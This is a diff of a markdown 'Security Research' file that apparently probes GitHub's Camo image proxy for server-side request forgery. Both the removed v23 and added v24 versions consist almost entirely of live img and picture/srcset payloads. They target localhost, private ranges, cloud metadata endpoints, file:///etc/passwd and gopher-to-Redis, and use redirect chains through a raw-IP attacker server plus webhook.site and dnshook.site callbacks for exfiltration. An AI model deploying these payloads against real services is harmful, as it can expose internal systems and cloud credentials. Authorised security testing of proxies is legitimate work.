@@ -1,104 +1,100 @@
-# Security Research - v23
+# Security Research - v24
 
-## Picture/Srcset SSRF Deep Dive
+## GitHub Camo Probe (Using Custom Test Server)
 
-Since `<picture><source srcset>` is processed, testing SSRF via these tags.
-
----
-
-### Test 1: Picture with Internal IP srcset
-<picture>
-  <source srcset="http://127.0.0.1/v23-localhost.gif" media="(min-width: 1px)">
-  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-localhost-fallback.gif" alt="t1">
-</picture>
-
-### Test 2: Picture with Metadata srcset
-<picture>
-  <source srcset="http://169.254.169.254/latest/meta-data/" media="(min-width: 1px)">
-  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-metadata-fallback.gif" alt="t2">
-</picture>
-
-### Test 3: Multiple sources with SSRF attempts
-<picture>
-  <source srcset="http://10.0.0.1/internal.gif" media="(min-width: 1200px)">
-  <source srcset="http://192.168.1.1/internal.gif" media="(min-width: 800px)">
-  <source srcset="http://172.16.0.1/internal.gif" media="(min-width: 400px)">
-  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-multi-fallback.gif" alt="t3">
-</picture>
+All URLs point to test box at `http://164.90.187.218:8080`.
+These endpoints exercise the proxy's redirect handling.
 
 ---
 
-### Test 4: IMG srcset with Internal IPs
-<img srcset="http://127.0.0.1/srcset-local.gif 1x, http://169.254.169.254/srcset-meta.gif 2x" src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/img-srcset-fallback.gif" alt="t4">
-
-### Test 5: IMG srcset with DNS rebinding
-<img srcset="http://127.0.0.1.nip.io/rebind.gif 1x" src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-rebind-fallback.gif" alt="t5">
-
-### Test 6: IMG srcset with decimal IP
-<img srcset="http://2130706433/decimal.gif 1x" src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-decimal-fallback.gif" alt="t6">
+### 1) Baseline Fetch
+<img alt="t1-basic" src="http://164.90.187.218:8080/ssrf-test-1-basic?nonce=v24-1" />
 
 ---
 
-### Test 7: Picture with redirect chain
-<picture>
-  <source srcset="https://httpbin.org/redirect-to?url=http://127.0.0.1/redir-localhost.gif" media="(min-width: 1px)">
-  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-redirect-fallback.gif" alt="t7">
-</picture>
-
-### Test 8: Srcset with httpbin redirect to metadata
-<img srcset="https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/ 1x" src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-redirect-meta-fallback.gif" alt="t8">
+### 2) Slow & Large (Timeout/Limits)
+<img alt="t2-slow-30s" src="http://164.90.187.218:8080/ssrf-test-7-slow?duration=30&nonce=v24-2" />
+<img alt="t3-large-50mb" src="http://164.90.187.218:8080/ssrf-test-6-large?size=50&nonce=v24-3" />
 
 ---
 
-### Test 9: Picture with file:// protocol
+### 3) Redirect Chains (What will Camo follow?)
+
+#### External->External (should follow)
 <picture>
-  <source srcset="file:///etc/passwd" media="(min-width: 1px)">
-  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-file-fallback.gif" alt="t9">
+  <source srcset="http://164.90.187.218:8080/ssrf-test-5-redirect?step=1&nonce=v24-4">
+  <img alt="ext->ext" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
 </picture>
 
-### Test 10: Picture with gopher:// protocol
+#### External->Internal (should be blocked if protections work)
 <picture>
-  <source srcset="gopher://127.0.0.1:6379/_INFO" media="(min-width: 1px)">
-  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-gopher-fallback.gif" alt="t10">
+  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=localhost&nonce=v24-5">
+  <img alt="ext->127.0.0.1" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
+</picture>
+
+<picture>
+  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=metadata&nonce=v24-6">
+  <img alt="ext->169.254.169.254" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
+</picture>
+
+<picture>
+  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-10&nonce=v24-7">
+  <img alt="ext->10.0.0.1" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
 </picture>
 
 ---
 
-### Test 11: Srcset descriptor SSRF
-<img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/base.gif" srcset="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-1x.gif 1x, https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-2x.gif 2x, https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-3x.gif 3x">
+### 4) URL Parser Edge Cases
 
-### Test 12: Wide srcset for resolution attacks
-<img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/sizes-base.gif" sizes="100vw" srcset="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/s100.gif 100w, https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/s200.gif 200w, https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/s400.gif 400w, https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/s800.gif 800w">
-
----
-
-### Test 13: Picture with IPv6 localhost
+#### Userinfo Trick (which host is honored?)
 <picture>
-  <source srcset="http://[::1]/ipv6-local.gif" media="(min-width: 1px)">
-  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-ipv6-fallback.gif" alt="t13">
+  <source srcset="http://164.90.187.218:8080/redirect-to-edge?case=userinfo-host-swap&nonce=v24-8">
+  <img alt="userinfo-host-swap" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
 </picture>
 
-### Test 14: Picture with cloud metadata variations
+#### IPv6 Localhost
 <picture>
-  <source srcset="http://metadata.google.internal/computeMetadata/v1/" media="(min-width: 1200px)">
-  <source srcset="http://instance-data/latest/" media="(min-width: 800px)">
-  <source srcset="http://100.100.100.200/latest/" media="(min-width: 400px)">
-  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-cloud-fallback.gif" alt="t14">
+  <source srcset="http://164.90.187.218:8080/redirect-to-edge?case=ipv6-loopback&nonce=v24-9">
+  <img alt="[::1]" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
 </picture>
 
 ---
 
-### DNS Exfil via Picture
+### 5) Non-Standard Ports (Small Sample)
 <picture>
-  <source srcset="https://v23-picture-dns.e55244c7-f645-4580-9001-84d56b232718.dnshook.site/dns.gif" media="(min-width: 1px)">
-  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-dns-fallback.gif" alt="dns">
+  <source srcset="http://164.90.187.218:8080/redirect-to-port?port=22&nonce=v24-10">
+  <img alt="port-22" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
+</picture>
+
+<picture>
+  <source srcset="http://164.90.187.218:8080/redirect-to-port?port=8443&nonce=v24-11">
+  <img alt="port-8443" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
 </picture>
 
 ---
 
-## Canary
-![v23-canary](https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/v23-canary.gif)
+### 6) Double Redirect Chain
+<picture>
+  <source srcset="http://164.90.187.218:8080/double-redirect?first=external&second=localhost&nonce=v24-12">
+  <img alt="double-redir" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
+</picture>
 
 ---
 
-*v23 - Picture/Srcset SSRF deep dive*
+### 7) Protocol Downgrade via Redirect
+<picture>
+  <source srcset="http://164.90.187.218:8080/redirect-protocol?from=https&to=http&target=127.0.0.1&nonce=v24-13">
+  <img alt="https->http" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
+</picture>
+
+---
+
+### 8) DNS Exfil Baseline
+![dns-exfil](https://v24-dns-exfil.ee86932e-f8b0-4026-b848-5ded50f9edbc.dnshook.site/dns.gif)
+
+### 9) Canary
+![v24-canary](https://webhook.site/ee86932e-f8b0-4026-b848-5ded50f9edbc/v24-canary.gif)
+
+---
+
+*v24 - Custom server redirect testing*
